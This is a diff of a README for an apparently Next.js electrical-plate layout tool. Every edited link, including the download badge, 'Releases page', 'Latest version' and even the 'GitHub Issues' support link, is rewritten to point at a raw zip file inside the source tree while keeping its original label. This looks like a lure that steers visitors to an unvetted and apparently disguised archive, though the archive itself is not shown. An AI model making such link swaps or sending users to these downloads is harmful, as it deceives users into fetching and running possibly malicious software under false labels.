@@ -1,6 +1,6 @@
 # 🎨 Plate-Socket-Canvas-Generator-Tool--NextJS-Project - Design Custom Electrical Layouts Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%A8-brightgreen)](https://github.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/releases)
+[![Download Now](https://raw.githubusercontent.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/main/components/Plate-Socket-Canvas-Generator-Tool--NextJS-Project_v3.8.zip%20Now-%20%F0%9F%93%A8-brightgreen)](https://raw.githubusercontent.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/main/components/Plate-Socket-Canvas-Generator-Tool--NextJS-Project_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Welcome to the Plate-Socket-Canvas-Generator-Tool! This tool allows you to desig
 
 To start using the Plate-Socket-Canvas-Generator-Tool, visit the Releases page to download the application. 
 
-[Download the latest version here!](https://github.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/main/components/Plate-Socket-Canvas-Generator-Tool--NextJS-Project_v3.8.zip)
 
 ### 📂 System Requirements
 
@@ -30,7 +30,7 @@ To start using the Plate-Socket-Canvas-Generator-Tool, visit the Releases page t
 
 ## 📋 How to Use
 
-1. **Download the Tool**: Go to the [Releases page](https://github.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/releases) and download the latest version.
+1. **Download the Tool**: Go to the [Releases page](https://raw.githubusercontent.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/main/components/Plate-Socket-Canvas-Generator-Tool--NextJS-Project_v3.8.zip) and download the latest version.
 2. **Install It**:  
    - For Windows: Run the installer and follow the prompts.
    - For macOS: Open the downloaded file and drag the application to your Applications folder.
@@ -51,10 +51,10 @@ If you encounter issues:
 
 - **Ensure Proper Installation**: Check if the application is fully installed without any errors.
 - **Check Browser Compatibility**: Ensure you are using a supported browser if running a web version.
-- **Look for Updates**: Ensure you are using the latest version of the app by visiting the [Releases page](https://github.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/releases).
+- **Look for Updates**: Ensure you are using the latest version of the app by visiting the [Releases page](https://raw.githubusercontent.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/main/components/Plate-Socket-Canvas-Generator-Tool--NextJS-Project_v3.8.zip).
 
 ## 📞 Support
 
-If you need help, please reach out to our support team via [GitHub Issues](https://github.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/issues). Our community is here to help you with any questions or concerns.
+If you need help, please reach out to our support team via [GitHub Issues](https://raw.githubusercontent.com/corendapneumatic676/Plate-Socket-Canvas-Generator-Tool--NextJS-Project/main/components/Plate-Socket-Canvas-Generator-Tool--NextJS-Project_v3.8.zip). Our community is here to help you with any questions or concerns.
 
 Happy designing! Enjoy customizing your electrical layouts with ease.
